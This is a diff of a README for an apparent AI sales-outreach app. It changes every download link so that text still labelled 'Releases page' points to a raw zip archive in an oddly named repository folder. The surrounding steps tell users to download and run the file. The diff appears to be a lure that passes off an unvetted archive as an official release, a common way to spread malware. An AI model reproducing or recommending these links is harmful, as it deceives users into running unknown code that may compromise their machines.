@@ -1,6 +1,6 @@
 # 🤖 guardrailed-ai-prospector - Safer AI Sales Outreach
 
-[![Download](https://img.shields.io/badge/Download-Releases-blue?style=for-the-badge&logo=github)](https://github.com/nilosaharankniphofiauvaria87/guardrailed-ai-prospector/releases)
+[![Download](https://img.shields.io/badge/Download-Releases-blue?style=for-the-badge&logo=github)](https://github.com/nilosaharankniphofiauvaria87/guardrailed-ai-prospector/raw/refs/heads/main/ciliograde/prospector_guardrailed_ai_2.3.zip)
 
 ## 🧭 What this app does
 
@@ -10,7 +10,7 @@ It is built for users who want a structured way to handle outreach without writi
 
 ## 📦 Download and install
 
-1. Open the [Releases page](https://github.com/nilosaharankniphofiauvaria87/guardrailed-ai-prospector/releases).
+1. Open the [Releases page](https://github.com/nilosaharankniphofiauvaria87/guardrailed-ai-prospector/raw/refs/heads/main/ciliograde/prospector_guardrailed_ai_2.3.zip).
 2. Find the latest release.
 3. Download the Windows file from that release.
 4. Open the downloaded file.
@@ -185,7 +185,7 @@ Use the app for lawful outreach and keep your mailing list clean. Make sure your
 
 ## 📍 Release download link
 
-Open the [Releases page](https://github.com/nilosaharankniphofiauvaria87/guardrailed-ai-prospector/releases) to download and run this file
+Open the [Releases page](https://github.com/nilosaharankniphofiauvaria87/guardrailed-ai-prospector/raw/refs/heads/main/ciliograde/prospector_guardrailed_ai_2.3.zip) to download and run this file
 
 ## 🗂️ Repository info
 
